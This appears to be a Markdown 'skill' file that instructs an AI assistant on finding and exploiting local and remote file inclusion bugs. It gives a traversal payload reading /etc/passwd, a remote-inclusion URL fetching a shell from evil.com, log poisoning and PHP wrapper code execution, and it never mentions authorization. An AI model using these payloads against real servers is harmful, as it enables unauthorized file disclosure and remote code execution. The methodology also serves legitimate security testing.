# File Inclusion Skill

## Goal

Identify and exploit file inclusion vulnerabilities (LFI and RFI) in web applications.

## Methodology

1.  **Identify Potential Vulnerabilities:** Look for URL parameters or other inputs that seem to be used to include files, such as `?file=`, `?page=`, `?include=`.
2.  **Test for Local File Inclusion (LFI):** Try to include local files from the server's filesystem. Common payloads include `../../../../etc/passwd` (on Linux) or `../../../../boot.ini` (on Windows).
3.  **Test for Remote File Inclusion (RFI):** If the application allows it, try to include a file from a remote server. For example, `http://evil.com/shell.txt`.
4.  **Log Poisoning:** If LFI is possible but you can't find a sensitive file to read, you may be able to poison a log file (like the web server's access log) with malicious code and then include the log file to execute the code.
5.  **PHP Wrappers:** If the application is running PHP, you can use PHP wrappers like `php://filter` to read the source code of files, or `php://input` to execute code.

## Tools

*   **A web browser:** For manual testing.
*   **Burp Suite:** To modify requests and automate testing.
*   **A remote server:** To host files for RFI testing.

## Example Payload (LFI)

```
/vulnerable.php?file=../../../../etc/passwd
```

## Guidance for AI

*   When a user wants to test for file inclusion vulnerabilities, this skill should be activated.
*   Explain the difference between LFI and RFI.
*   Provide a list of common payloads for LFI and RFI.
*   Guide the user on how to use Burp Suite to modify parameters and test for these vulnerabilities.
*   Explain the potential impact, which can range from information disclosure to remote code execution.
*   Advise the user to be careful, as a successful RFI exploit can give an attacker full control over the server.
